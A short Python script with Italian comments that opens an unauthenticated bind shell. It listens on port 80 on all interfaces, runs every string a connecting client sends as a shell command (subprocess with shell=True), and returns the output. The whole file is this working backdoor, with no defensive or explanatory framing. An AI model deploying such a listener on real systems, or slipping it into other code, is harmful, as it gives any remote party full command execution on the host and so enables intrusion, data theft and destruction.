# creazione del collegamento tra la socket e la porta

# imports
import socket
import subprocess
import sys

def comandi(conn):
    while True:
        richiesta = conn.recv(4096)
        risposta = subprocess.run(richiesta.decode(), shell = True, 
                                  stdout = subprocess.PIPE,
                                  stderr = subprocess.PIPE)
        data = risposta.stdout + risposta.stderr
        conn.send(data)
    
    
def sub_server(indirizzo, backlog = 1): # connessioni ammesse
    try:
        s = socket.socket()
        s.bind(indirizzo)   # collegamento vero e proprio
        s.listen(backlog)
        print("Server inizializzato correttamente")
    
    except socket.error as errore:
        print("Server non inizializzato")
        print()
        sys.exit()
        
        
    conn, indirizzo_client = s.accept()
    print("Connessione Client - Server stabilita")
    comandi(conn)
    
if __name__ == "__main__":
    sub_server(("",80))
    
    